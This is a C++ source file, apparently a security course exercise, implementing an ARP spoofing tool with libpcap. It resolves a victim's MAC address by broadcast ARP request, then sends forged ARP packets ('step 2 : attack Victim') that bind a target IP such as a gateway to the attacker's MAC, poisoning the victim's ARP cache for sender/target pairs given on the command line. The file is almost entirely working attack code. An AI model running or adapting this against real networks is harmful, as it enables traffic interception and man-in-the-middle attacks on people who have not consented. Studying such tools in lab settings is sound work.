#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "mine.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ... ]\n");
    printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

void send_pckt(pcap_t* handle, uint8_t* src_mac, uint8_t* dst_mac, char* src_ip, char* dst_ip){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(dst_mac);
    packet.eth_.smac_ = Mac(src_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(src_mac);
    packet.arp_.sip_ = htonl(Ip(src_ip));
    packet.arp_.tmac_ = Mac(dst_mac);
    packet.arp_.tip_ = htonl(Ip(dst_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

}
int main(int argc, char* argv[]) {
    if (argc % 2  == 1 || argc < 3) {
        usage();
        return -1;
    }

    char* dev = argv[1];

    for(int i=2; i<argc; i+=2){
        printf("----Set %d----\n", i/2);
        printf("(sender) ip : %s\nTarget ip : %s\n\n", argv[i], argv[i+1]);

        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
        if (handle == nullptr) {
            fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
            return -1;
        }

        uint8_t attacker_mac[7];
        uint8_t sender_mac[7];

        uint8_t my_mac[18];     // only for print
        uint8_t victim_mac[18]; // only for print

        int getMac = GetMacAddress(dev, attacker_mac);

        if(getMac != 0){
            printf("Failed to get MAC address...\n");
            return -1;
        }

        hextostr(attacker_mac, my_mac); 	 // print
        printf("Attacker's mac : %s\n", my_mac); // print


        // step1 : get Victim(Sender)'s mac address

        struct pcap_pkthdr* header;
        const u_char* pckt;
        //EthArpPacket packet;

        uint8_t broadcast[7] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
        char ip_zero[8] = "0.0.0.0";

        send_pckt(handle, attacker_mac, broadcast, ip_zero, argv[i]);

        while(true){
            int reply = pcap_next_ex(handle, &header, &pckt);
            if(reply == 0) continue;
            if(reply == PCAP_ERROR || reply == PCAP_ERROR_BREAK){
                printf("pcap_next_ex return %d\n",reply);
                pcap_close(handle);
                return -1;
            }

            EthArpPacket packet;
            memcpy(&packet, pckt, sizeof(EthArpPacket));

            if(ntohs(packet.eth_.type_) != 0x806) continue;
            //printf("%x\n", *(uint8_t*)packet.arp_.smac());
            if(ntohs(packet.arp_.op_) != 2 || packet.arp_.sip() != Ip(argv[i])) continue;

            memcpy(sender_mac, (uint8_t*)packet.arp_.smac(), 6);

            break;
        }

        PArpHdr arp_hdr = (PArpHdr)(pckt + sizeof(EthHdr));
        //printf("%u bytes captured\n", header->caplen); // print
        hextostr((uint8_t*)arp_hdr+0x8, victim_mac);   // print
        printf("Victim's mac : %s\n", victim_mac);     // print

        // step 2 : attack Victim
        send_pckt(handle, attacker_mac, sender_mac, argv[i+1], argv[i]);
        pcap_close(handle);
        printf("\n");
    }
}
